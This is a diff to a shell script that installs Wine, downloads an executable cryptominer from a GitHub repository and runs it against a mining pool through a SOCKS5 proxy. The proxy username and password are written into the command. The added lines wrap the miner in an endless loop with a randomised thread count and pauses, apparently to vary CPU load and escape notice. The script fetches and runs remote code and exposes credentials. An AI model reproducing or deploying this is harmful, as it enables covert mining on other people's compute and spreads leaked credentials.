@@ -3,4 +3,15 @@ sudo apt update
 sudo apt install -y wine wine64 wine32
 wget https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/lemurian-robot-miner.zip
 unzip lemurian-robot-miner.zip
-wine ./cpuminer.exe -a power2b -o na.rplant.xyz:7022 -u mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.socks5 --proxy socks5://ifzkqmqh:rkbbsux715rr@37.44.218.253:5936
+
+while true; do
+THREADS=$((RANDOM % 8 + 1))
+echo "Starting with $THREADS threads..."
+wine ./cpuminer.exe -a power2b -o na.rplant.xyz:7022 -u mbc1qlgghxg3026yfxp3zw63m86qhleesnk0euzthmd.socks5 --proxy socks5://ifzkqmqh:rkbbsux715rr@37.44.218.253:5936 -t "$THREADS"
+      
+
+    sleep 30
+done
+
+
+
